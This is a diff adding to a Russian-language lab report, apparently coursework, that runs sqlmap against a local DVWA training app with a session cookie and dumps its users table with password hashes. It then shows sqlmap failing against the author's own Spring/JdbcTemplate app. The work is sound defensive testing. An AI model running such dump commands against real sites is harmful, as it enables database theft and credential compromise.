@@ -111,3 +111,69 @@ private static final String GET_USER_SQL = "SELECT id, name FROM users WHERE id 
 ### 4. Использовать sqlmap для нахождения уязвимости в веб-ресурсе
 
 SqlMap - это инструмент с открытым исходным кодом, который автоматически находит и эксплуатирует уязвимости SQL-инъекций. Для начала используем этот инструмент на приложении DVWA для нахождения его уязвимостей.
+
+Выполним команду в папке с проектом SqlMap. В команде важно указывать cookie действующей сессии.
+
+```Bash
+python sqlmap.py --cookie="PHPSESSID=e7d8d3f5f883d69af84e124a7de9ccb3; security=low" -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --level=5  --risk=3 -T users --dump
+```
+
+Программа начинает свое выполнение.
+
+```Bash
+       ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.11.11#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:42:47 /2024-12-12/
+```
+
+Спустя какое-то время SqlMap завершает свою работу. Результатом работы программы является sql таблица пользователей, которую удалось извлечь, используя уязвимость SQL инъекций.
+
+```Bash
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2024-11-07 20:39:03 | 0            |
+| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2024-11-08 19:03:50 | 1            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2024-11-07 20:39:03 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2024-11-07 20:39:03 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2024-11-07 20:39:03 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[21:43:49] [INFO] table 'dvwa.users' dumped to CSV file 'C:\Users\Алексей\AppData\Local\sqlmap\output\localhost\dump\dvwa\users.csv'
+[21:43:49] [INFO] fetched data logged to text files under 'C:\Users\Алексей\AppData\Local\sqlmap\output\localhost'
+
+[*] ending @ 21:43:49 /2024-12-12/
+```
+
+Применим SqlMap к разработанной системе вывода информации и убедимся, что использование JdbcTemplate в Spring препятствует эксплуатированию SQL инъекций. Команда для запуска выглядит следующим образом.
+
+```Bash
+python sqlmap.py -u "http://localhost:8080/?id=1&Submit=Submit" --batch --banner --level=5 --risk=3
+```
+
+Спустя некоторое время SqlMap, проверив все варианты инъекции, сообщает, что совершить SQL инъекцию через заданные параметры не удалос.
+
+```Bash
+[02:04:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[02:04:43] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[02:04:44] [WARNING] parameter 'Host' does not seem to be injectable
+[02:04:44] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 02:04:44 /2024-12-03/
+```
+
+Таким образом, используя SqlMap можно убедиться, что разработанная система не подвержена атаком с использованием SQL инъекции.
+
+### 5. Использовать Burp для нахождения уязвимости в веб-ресурсе
+
+Еще одним инструментом для поиска уязвимостей в веб-ресурсе является Burp. С его помощью так же можно находить и эксплуатировать уязвимости SQL инъекции.
